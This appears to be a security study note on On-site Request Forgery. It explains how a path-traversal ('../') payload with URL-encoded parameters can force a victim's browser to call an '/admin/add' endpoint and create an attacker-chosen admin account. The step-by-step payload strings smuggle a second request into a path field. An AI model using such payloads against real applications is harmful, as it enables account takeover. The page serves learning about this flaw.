---
description: On-site Request Forgery
---

# OSRF

💡If you're able to control part of the URL used to make an HTTP request you probably have OSRF.

* To confirm, try injecting the “../” characters which will cause the request to go up one directory, if this is possible you definitely have OSRF.

When looking at OSRF it can feel very similar to XSS:

* using user-supplied input to make HTTP requests.

**Vulnerable code snippet:**

Force the user to send a request to the “/admin/add” endpoint  ->  adding an admin user which the attacker could use to log in to the victims.

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

**Exploitation Scenario:**

Make a request to the “/admin/add” endpoint causing the application to add a new user called “ghost” with the password “lulz”:

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

* when sending multiple parameters we must URL encode the “&” character otherwise the browser will think it belongs to the first request not the second.
* If we add the username and password parameters we should be able to add an admin account.

1. add "../../"   -> returns "/.jpg"

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

2. add  "../../admin/add.jpg"  -> returns "/admin/add.jpg"

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

3. add the username and password parameters to be able to add an admin account:

* "../../admin/add?username=ghost%26password=lulz"  -> returns "/admin/add?username=ghost\&password=lulz.jpg"

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

4. add a dummy parameter to get rid of “.jpg” in “lulz.jpg”:

* "../../admin/add?username=ghost%26password=lulz %26dummy\_param="    ->  "/admin/add?username=ghost\&password=lulz\&dummy\_param=.jpg"

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

Finally, we are able to make a request to the “/admin/add” endpoint causing the application to add a new user called “ghost” with the password “lulz”.
